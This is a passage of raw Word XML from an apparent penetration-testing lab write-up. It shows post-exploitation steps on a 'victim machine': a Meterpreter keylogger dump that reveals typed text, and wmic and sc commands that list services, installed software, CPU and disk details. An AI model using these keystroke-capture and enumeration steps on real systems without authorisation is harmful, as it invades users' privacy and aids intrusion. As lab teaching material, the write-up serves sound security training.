      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">We have created a file called “intellipaat.txt” and have put some documents ..</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001B9">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001BA">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001BB">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we will do keyscan_dump</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001BC">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001BD">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87"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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">We can see that whatever we have written in the “intellipaat.txt” file all are visible along with keyboard function[CAPS LOCK , SHIFT] .</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001BF">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001C0">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001C1">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">NOW WE WILL EXPLORE MORE THINGS IN THE TARGET SYSTEM BY USING THE COMMAND “wmic”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001C2">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001C3">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">TO SEE ALL THE SERVICES CURRENTLY RUNNING IN THE VICTIM MACHINE WE NEED TO TYPE IN THE “shell” THAT MEANS THE TERMINAL </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001C4">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001C5">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">sc queryex type=service state=all</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001C6">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001C7">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72"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green"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distB="114300" distT="114300" distL="114300" distR="114300">
            <wp:extent cx="5731200" cy="2997200"/>
            <wp:effectExtent b="0" l="0" r="0" t="0"/>
            <wp:docPr id="75"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green"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distB="114300" distT="114300" distL="114300" distR="114300">
            <wp:extent cx="5731200" cy="2997200"/>
            <wp:effectExtent b="0" l="0" r="0" t="0"/>
            <wp:docPr id="62" name="image54.png"/>
            <a:graphic>
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic>
                  <pic:nvPicPr>
                    <pic:cNvPr id="0" name="image54.png"/>
                    <pic:cNvPicPr preferRelativeResize="0"/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId84"/>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green"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distB="114300" distT="114300" distL="114300" distR="114300">
            <wp:extent cx="5731200" cy="2997200"/>
            <wp:effectExtent b="0" l="0" r="0" t="0"/>
            <wp:docPr id="16" name="image8.png"/>
            <a:graphic>
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic>
                  <pic:nvPicPr>
                    <pic:cNvPr id="0" name="image8.png"/>
                    <pic:cNvPicPr preferRelativeResize="0"/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId85"/>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green"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distB="114300" distT="114300" distL="114300" distR="114300">
            <wp:extent cx="5731200" cy="2997200"/>
            <wp:effectExtent b="0" l="0" r="0" t="0"/>
            <wp:docPr id="47" name="image43.png"/>
            <a:graphic>
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic>
                  <pic:nvPicPr>
                    <pic:cNvPr id="0" name="image43.png"/>
                    <pic:cNvPicPr preferRelativeResize="0"/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId86"/>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green"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distB="114300" distT="114300" distL="114300" distR="114300">
            <wp:extent cx="5731200" cy="2997200"/>
            <wp:effectExtent b="0" l="0" r="0" t="0"/>
            <wp:docPr id="97"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green"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distB="114300" distT="114300" distL="114300" distR="114300">
            <wp:extent cx="5731200" cy="2997200"/>
            <wp:effectExtent b="0" l="0" r="0" t="0"/>
            <wp:docPr id="54"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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">THESE ALL ARE THE SERVICES RUNNING IN THE VICTIM MACHINE..</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001C9">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001CA">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">To check all the installed software version the command is:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001CB">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001CC">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">wmic /node:”” product get name,verdor,version</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001CD">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001CE">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94"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bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">These are the list of all installed software version in the victim system.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001D0">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001D1">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">To get CPU information:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001D2">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001D3">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">wmic cpu get</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001D4">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39" name="image40.png"/>
            <a:graphic>
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic>
                  <pic:nvPicPr>
                    <pic:cNvPr id="0" name="image40.png"/>
                    <pic:cNvPicPr preferRelativeResize="0"/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId9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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Or </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001D6">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001D7">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">wmic cpu list brief</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001D8">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2" name="image2.png"/>
            <a:graphic>
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic>
                  <pic:nvPicPr>
                    <pic:cNvPr id="0" name="image2.png"/>
                    <pic:cNvPicPr preferRelativeResize="0"/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId9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bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">This is the cpu information of the victim system in brief:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001DA">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001DB">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">To get detailed information:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001DC">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001DD">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">wmic cpu list full:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001DE">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001DF">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13"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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001E1">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">To get diskdrive information </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001E2">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">wmic diskdrive list brief</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001E3">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001E4">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28"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2"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001E5">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001E6">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
